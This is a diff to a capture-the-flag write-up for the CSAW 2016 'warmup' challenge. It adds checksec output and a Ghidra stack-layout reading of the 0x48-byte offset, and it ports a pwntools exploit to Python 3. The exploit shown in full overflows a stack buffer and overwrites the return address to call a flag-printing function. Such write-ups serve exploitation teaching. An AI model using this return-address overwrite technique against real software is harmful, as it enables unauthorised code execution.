@@ -5,6 +5,13 @@ Let's take a look at the binary:
 ```
 $    file warmup
 warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
+$     pwn checksec warmup
+[*] '/Hackery/nightmare/modules/05-bof_callfunction/csaw16_warmup/warmup'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 $    ./warmup
 -Warm Up-
 WOW:0x40060d
@@ -154,16 +161,35 @@ With a bit of math, we see the offset:
 '0x48'
 ```
 
+We can also find the offset from the start of our input to the saved return address in ghidra. At the start of the function, it will display the stack layout. It will address the various variables on the stack with the offset to the saved return address. We see that `input` is addressed at `-0x48`, so it is `0x48` bytes away from the saved return address. I have seen some instances where Ghidra gets this wrong, but it is always good to know multiple ways to accomplish the same thing.
+
+```
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined main()
+             undefined         AL:1           <RETURN>
+             undefined1[64]    Stack[-0x48]   input                                   XREF[1]:     00400692(*)  
+             undefined1[64]    Stack[-0x88]   easyFunctionAddress                     XREF[2]:     0040064d(*),
+                                                                                                   00400668(*)  
+                             main                                            XREF[5]:     Entry Point(*),
+                                                                                          _start:0040053d(*),
+                                                                                          _start:0040053d(*), 0040077c,
+                                                                                          00400830(*)  
+        0040061d 55              PUSH       RBP
+
+```
+
 So we can see that after `0x48` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
 ```
 from pwn import *
 
 target = process('./warmup')
-#gdb.attach(target, gdbscript = 'b *0x4006a3')
+gdb.attach(target, gdbscript = 'b *0x4006a3')
 
 # Make the payload
-payload = ""
-payload += "0"*0x48 # Overflow the buffer up to the return address
+payload = b""
+payload += b"0"*0x48 # Overflow the buffer up to the return address
 payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function
 
 # Send the payload
@@ -172,9 +198,9 @@ target.sendline(payload)
 target.interactive()
 ```
 
-When we run it:
+When we run it. This might crash on the `system("cat flag.txt")` if you are running it on a more modern version of Ubuntu. If it does, ignore it and move on, consider this challenge solved (as long as you are successfully calling the `easy` function). This is because the challenge was made to run in a different environment/libc version, and exploitation techniques that work one way in one environment work differently in others:
 ```
-$    python exploit.py
+$    python3 exploit.py
 [+] Starting local process './warmup': pid 4652
 [*] Switching to interactive mode
 -Warm Up-
@@ -183,4 +209,4 @@ WOW:0x40060d
 [*] Got EOF while reading in interactive
 ```
 
-Just like that, we got the flag! As a sidenote, I've heard of instances where in certain enviornments the offset is `0x40` instead of `0x48`.
+Just like that, we got the flag! As a side note, I've heard of instances where in certain environments the offset is `0x40` instead of `0x48`.
